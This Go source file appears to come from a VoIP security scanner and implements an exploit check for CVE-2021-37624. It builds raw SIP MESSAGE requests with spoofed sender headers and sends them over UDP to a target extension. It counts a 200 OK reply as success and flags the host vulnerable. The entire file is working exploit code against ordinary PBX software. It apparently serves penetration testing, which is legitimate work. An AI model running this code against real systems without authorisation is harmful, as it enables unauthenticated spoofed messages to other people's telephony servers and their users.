package main

import (
	"fmt"
	"log"
	"net"
	"regexp"
	"strings"
	"time"
)

var (
	validateRex = regexp.MustCompile(`(?i)20\d\s*(?:OK|Accepted)`)
)

func cve2021x37624(host string, pResult *fResult) {
	conn, err := net.DialTimeout("udp", strings.Split(host, "@")[1], 2*time.Second)
	if err != nil {
		log.Println(err.Error())
		return
	}
	defer conn.Close()

	localIP := conn.LocalAddr().String()
	for _, message := range msgstosend {
		var payload string
		payload += fmt.Sprintf("MESSAGE sip:%s SIP/2.0\r\n", host)
		payload += fmt.Sprintf("Via: SIP/2.0/UDP %s;rport;branch=z9hG4bK-%s\r\n", localIP, genRandStr(8))
		payload += fmt.Sprintf("From: \"%s\" <sip:%s@%s>;tag=%s\r\n", message[0], message[1], strings.Split(host, "@")[1], genRandStr(8))
		payload += fmt.Sprintf("To: <sip:%s>\r\n", host)
		payload += "CSeq: 1 MESSAGE\r\n"
		payload += "Content-Type: text/plain\r\n"
		payload += fmt.Sprintf("Call-ID: %s\r\n", genRandStr(20))
		payload += fmt.Sprintf("Contact: <sip:%s@%s;transport=udp>\r\n", message[1], strings.Split(host, "@")[1])
		payload += "Max-Forwards: 70\r\n"
		payload += fmt.Sprintf("Content-Length: %d\r\n", len(message[2]))
		payload += "\r\n"
		payload += message[2]

		conn.SetDeadline(time.Now().Add(5 * time.Second))
		_, err = conn.Write([]byte(payload))
		if err != nil {
			log.Println(err.Error())
		}
		mbuff := make([]byte, 64)
		_, err = conn.Read(mbuff)
		if err != nil {
			log.Println(err.Error())
		}
		var expdets ExpDetails37624
		expdets.Extension = strings.Split(host, "@")[0]
		expdets.Messages = append(expdets.Messages, message[2])
		if validateRex.Match(mbuff) {
			expdets.SentSuccessfully = true
			pResult.Details.CVE202137624.IsVulnerable = true
		}
		// sleep for 2 seconds by default to avoid sending too many messages at once
		time.Sleep(2 * time.Second)
		pResult.Details.CVE202137624.ExploitDetails = append(pResult.Details.CVE202137624.ExploitDetails, expdets)
	}
	log.Printf("Exploit completed for CVE-2021-37624: %s", host)

}
